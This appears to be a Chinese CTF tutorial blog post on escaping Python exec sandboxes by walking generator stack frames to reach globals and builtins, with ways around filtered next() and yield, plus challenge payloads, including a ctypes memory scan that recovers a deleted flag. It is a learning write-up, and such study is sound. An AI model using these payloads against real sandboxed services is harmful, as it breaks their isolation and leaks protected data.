+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g=f()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_globals[<span class="string">&#x27;__builtins__&#x27;</span>]  <span class="comment">#这里获取到了内置命名空间，在这里就可以获取到内置函数</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span>)如何获取，可以另外用一个变量来获取，再利用，如下：</span><br><span class="line"><span class="built_in">str</span>=d.<span class="built_in">str</span>  <span class="comment">#这样就可以直接利用str来替代内置函数str()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)那么如何更改内置函数，就像L3HCTF那道题payload，可以自己定义一个来更改后赋值即可。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>看了一下栈帧的属性，试一下<code>f_builtins</code>，如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g=f()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_builtins.<span class="built_in">str</span>  <span class="comment">#这里获取到了内置命名空间，在这里就可以获取到内置函数</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">Output：</span><br><span class="line">AttributeError: <span class="string">&#x27;dict&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>有点奇怪，问了一下，原因大概如下：</p>
+<ul>
+<li><p><code>f_globals</code>是一个字典，包含了当前帧的全局变量。我们可以通过键来访问这个字典中的元素。在上一个代码中，<code>c.f_globals[&#39;__builtins__&#39;]</code>访问的是全局变量的一部分<code>__builtins__</code>，它指向内置命名空间，这个命名空间本身可以是一个模块或者一个字典，这取决于它是在交互式解释器中使用还是在一个脚本中。在大多数情况下，<code>__builtins__</code>是一个模块对象，你可以直接通过属性访问方式获取内置函数，如<code>.str</code>。</p>
+</li>
+<li><p><code>f_builtins</code>属性通常是一个对应内置命名空间的字典。这意味着，尽管它包含了所有的内置对象，但你不能使用属性访问方式来获取它们，因为字典不支持通过属性来访问键值，而是应该使用字典的键来访问。因此，你不能写<code>c.f_builtins.str</code>来获取<code>str</code>函数，而应该写<code>c.f_builtins[&#39;str&#39;]</code>。</p>
+</li>
+</ul>
+<p>对于这里的理解可以尝试和ssti的继承链结合，这样就好理解了，所以我们这里需要改，如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">g=f()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_builtins[<span class="string">&#x27;str&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>成功获取到,由此可以进行后续操作</p>
+<h3 id="利用栈帧沙箱逃逸"><a href="#利用栈帧沙箱逃逸" class="headerlink" title="利用栈帧沙箱逃逸"></a>利用栈帧沙箱逃逸</h3><p>原理就是通过生成器的栈帧对象再来使用f_back来返回前一帧从而逃逸出去获取globals全部变量（builtins同理）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    g = f()  #生成器</span></span><br><span class="line"><span class="string">    frame = next(g) #获取到生成器的栈帧对象</span></span><br><span class="line"><span class="string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals</span></span><br><span class="line"><span class="string">    return b</span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code,<span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>此时可以得到全局变量<code>secret</code>的值，</p>
+<p><strong>解读一下</strong></p>
+<p>看了这个示例代码后，思考了一下流程，我改了一下，用如下测试代码看这是如何进行换帧的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g = f()  <span class="comment">#生成器</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line">frame = <span class="built_in">next</span>(g) <span class="comment">#获取到生成器的栈帧对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line">f = frame.f_globals[<span class="string">&#x27;s3cret&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> f at <span class="number">0x00000247258E87D0</span>&gt;</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">&lt;frame at <span class="number">0x0000024725B08AE0</span>, file <span class="string">&#x27;D:\\clx\\ceshi.py&#x27;</span>, line <span class="number">13</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line">this <span class="keyword">is</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后再改一点点：</span><br><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g = f()  <span class="comment">#生成器</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line">frame = <span class="built_in">next</span>(g) <span class="comment">#获取到生成器的栈帧对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line">f = frame.f_back  <span class="comment">#只有这里被改了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">Output：</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> f at <span class="number">0x000001DD5A3689E0</span>&gt;</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">&lt;frame at <span class="number">0x000001DD5A4D8AE0</span>, file <span class="string">&#x27;D:\\clx\\venv\\haha.py&#x27;</span>, line <span class="number">12</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>
+
+<p>稍微说明一下（个人理解）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1对应 def f():</span><br><span class="line">    这一部分</span><br><span class="line">    </span><br><span class="line">2就已经通过f()函数里面的f_back进入到了全局变量这一帧</span><br><span class="line">3就可以获得全局变量了。</span><br></pre></td></tr></table></figure>
+
+<p>这里注意：看两个代码代码在3的区别，结合第二串代码如果在改的那里改为<code>frame.f_back.f_back</code>会报错，</p>
+<p><strong>可以得出一个结论</strong>：当使用最后一个<code>f_back</code>输出为None时，此时就这个帧已经对应到全局帧，可以直接利用。</p>
+<p><strong>现在来解析一下之前给的示例</strong>，按照我原先的理解，我会认为<code>f_back</code>会多一个，一直想不清楚。向baicany大哥请教了一下，悟了：</p>
+<p><strong>这个<code>exec</code>在执行时会创建一个环境，所以还需要在调用一个<code>f_back</code>逃逸从而去到全局那一帧。</strong></p>
+<p>我们来改一下代码看结果：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def f():</span></span><br><span class="line"><span class="string">    yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">g = f()  #生成器</span></span><br><span class="line"><span class="string">print(&#x27;1:&#x27;)</span></span><br><span class="line"><span class="string">print(g)</span></span><br><span class="line"><span class="string">frame = next(g) #获取到生成器的栈帧对象</span></span><br><span class="line"><span class="string">print(&#x27;2:&#x27;)</span></span><br><span class="line"><span class="string">print(frame)</span></span><br><span class="line"><span class="string">f = frame.f_back</span></span><br><span class="line"><span class="string">print(&#x27;3:&#x27;)</span></span><br><span class="line"><span class="string">print(f)</span></span><br><span class="line"><span class="string">d=f.f_globals[&#x27;s3cret&#x27;]</span></span><br><span class="line"><span class="string">print(&#x27;4:&#x27;)</span></span><br><span class="line"><span class="string">print(d)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">exec</span>(codes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output：</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> f at <span class="number">0x000001DE562387D0</span>&gt;</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">&lt;frame at <span class="number">0x000001DE56409760</span>, file <span class="string">&#x27;&lt;string&gt;&#x27;</span>, line <span class="number">10</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line">&lt;frame at <span class="number">0x000001DE56409800</span>, file <span class="string">&#x27;D:\\clx\\venv\\haha.py&#x27;</span>, line <span class="number">21</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">4</span>:</span><br><span class="line">this <span class="keyword">is</span> flag</span><br></pre></td></tr></table></figure>
+
+<p>看结果，可以看出成功出来了，www，本来想到是函数问题了，但在示例中最后那里调用了几个函数我就把这个问题排除了，<strong>exec()特殊</strong>！！！</p>
+<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><h5 id="过滤函数next"><a href="#过滤函数next" class="headerlink" title="过滤函数next()"></a>过滤函数next()</h5><p>即命名空间这样设置：<code>&#123;&#39;__builtins__&#39;: None&#125;</code>，这就导致了内置函数<code>next()</code>不能使用</p>
+<p><strong>（1）</strong>可以使用for循环,这里是采用的列表推导式，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next(g) ==&gt; [x for x in g][0]</span><br></pre></td></tr></table></figure>
+
+<p>但是注意，这里使用for循环来获取生成器对象会增加一个栈帧，所以需要再加一个<code>f_back</code>。</p>
+<p><strong>（2）<code>send()</code>函数</strong></p>
+<p>可以通过send()给生成器传递数据，调用<code>send()</code>后，就不用再调用了<code>next()</code>了。</p>
+<p>直接给测试代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g = f()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line">frame = g.send(<span class="literal">None</span>)</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">    <span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> f at <span class="number">0x000001F30C930E40</span>&gt;</span><br><span class="line">&lt;frame at <span class="number">0x000001F30C527800</span>, file <span class="string">&#x27;D:\\clx\\venv\\haha.py&#x27;</span>, line <span class="number">8</span>, code &lt;module&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到已经逃逸到了全局空间。这里就是需要注意调用<code>send()</code>函数的格式和函数参数</p>
+<h5 id="过滤yield-关键字"><a href="#过滤yield-关键字" class="headerlink" title="过滤yield 关键字"></a>过滤yield 关键字</h5><p>正好前面提到了变形的列表推导式也可以当做yield关键字来定义生成器，如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=(a.gi_frame.f_back.f_back <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">这两个相当于</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>:</span><br><span class="line">    <span class="keyword">yield</span> </span><br><span class="line">g=a()</span><br></pre></td></tr></table></figure>
+
+<p>给个代码来对比一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">a=(a.gi_frame.f_back <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">frame = <span class="built_in">next</span>(a) <span class="comment">#获取到生成器的栈帧对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line">d=frame.f_globals[<span class="string">&#x27;s3cret&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> &lt;genexpr&gt; at <span class="number">0x0000022469D6D630</span>&gt;</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">&lt;frame at <span class="number">0x0000022469CC8B40</span>, file <span class="string">&#x27;D:\\clx\\venv\\haha.py&#x27;</span>, line <span class="number">8</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line">this <span class="keyword">is</span> flag</span><br></pre></td></tr></table></figure>
+
+<p><code>[1]</code>可以换成<code>range(1)</code>，同样绕过方法可以组合起来用，注意<code>f_back</code>个数即可。</p>
+<h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><h5 id="L3HCTF-2024-intractable-problem-revenge"><a href="#L3HCTF-2024-intractable-problem-revenge" class="headerlink" title="L3HCTF 2024 -intractable problem revenge"></a>L3HCTF 2024 -intractable problem revenge</h5><p>暂时没找到复现环境，payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">factorization</span>(<span class="params">n</span>):</span><br><span class="line">    a=(a.gi_frame.f_back.f_back <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    a=[x <span class="keyword">for</span> x <span class="keyword">in</span> a][<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">globals</span>=a.f_back.f_back.f_globals</span><br><span class="line">    builtin = <span class="built_in">globals</span>[<span class="string">&quot;_&quot;</span> + <span class="string">&quot;_builtins_&quot;</span> + <span class="string">&quot;_&quot;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fakeint</span>(<span class="params">i</span>):</span><br><span class="line">        <span class="keyword">if</span>(builtin.<span class="built_in">len</span>(i)&gt;<span class="number">100</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">123123</span>*<span class="number">123123</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">123123</span></span><br><span class="line"></span><br><span class="line">    builtin.<span class="built_in">int</span>=fakeint</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>简单看了一下，逃逸过后进入到全局变量来改函数</p>
+<p>L3HCTF官方wp：<code>https://hust-l3hsec.feishu.cn/docx/MZ8SdwSoPo3cBTxOxbGcuUBun4c</code></p>
+<h5 id="第九届中国海洋大学-菜狗工具-2"><a href="#第九届中国海洋大学-菜狗工具-2" class="headerlink" title="第九届中国海洋大学-菜狗工具#2"></a>第九届中国海洋大学-菜狗工具#2</h5><p>题目描述：小王经过上次的惨痛教训后深刻反思，得出了解决不了 flag 泄露就解决 flag 本身的办法 这次你能拿到 flag 吗？</p>
+<p>——————————————</p>
+<p>附件内容：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">black_list = [</span><br><span class="line">    <span class="string">&#x27;__build_class__&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;breakpoint&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;input&#x27;</span></span><br><span class="line">]</span><br><span class="line">new_builtins = <span class="built_in">dict</span>([</span><br><span class="line">    (key, val) <span class="keyword">for</span> key, val <span class="keyword">in</span> __builtins__.__dict__.items() <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> black_list</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxxxx&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;DISPOSED&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/static/index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    out = io.StringIO()</span><br><span class="line">    script = <span class="built_in">str</span>(request.form[<span class="string">&quot;script&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrap_print</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        kwargs[<span class="string">&quot;file&quot;</span>] = out</span><br><span class="line">        <span class="built_in">print</span>(*args, **kwargs)</span><br><span class="line">    new_builtins[<span class="string">&quot;print&quot;</span>] = wrap_print</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span>(script, &#123;<span class="string">&quot;__builtins__&quot;</span>: new_builtins&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        wrap_print(e)</span><br><span class="line">    </span><br><span class="line">    ret = out.getvalue()</span><br><span class="line">    out.close()</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">5</span>) <span class="comment"># current source file is deleted</span></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">9001</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这道题的提交按钮被disables了，删了就能提交了</p>
+<p>直接用栈帧逃逸打吧，这道题对于栈帧逃逸的关键字没得过滤，可以直接用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    <span class="keyword">yield</span> a.gi_frame.f_back</span><br><span class="line">	</span><br><span class="line">a=haha()</span><br><span class="line">c=<span class="built_in">next</span>(a)</span><br><span class="line">d=c.f_back.f_globals[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/image-20240605224858187.png" alt="image-20240605224858187"></p>
+<h6 id="ctypes模块"><a href="#ctypes模块" class="headerlink" title="ctypes模块"></a>ctypes模块</h6><p>但是这里的flag被删除了，不会了，看下<strong>晨曦师傅的做法</strong></p>
+<p>思路：题目环境在 chroot jail 中，没有 &#x2F;proc 目录，不能通过读文件的方式读内存，但是</p>
+<p><strong>可以利用<code>ctypes</code>模块的指针</strong>，将flag地址周围的值读一下，实现一个从内存读源码的操作。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back.f_back</span><br><span class="line"></span><br><span class="line">g = f()</span><br><span class="line">frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br><span class="line">b = frame.f_back.f_globals</span><br><span class="line">flag_id=<span class="built_in">id</span>(b[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line">ctypes = b[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>)</span><br><span class="line"><span class="comment">#print(ctypes)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">	txt = ctypes.cast((flag_id-<span class="number">8</span>*i),ctypes.c_char_p).value</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;flag&#123;&quot;</span> <span class="keyword">in</span> txt:</span><br><span class="line">		<span class="built_in">print</span>(txt)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>学习一下wp：</p>
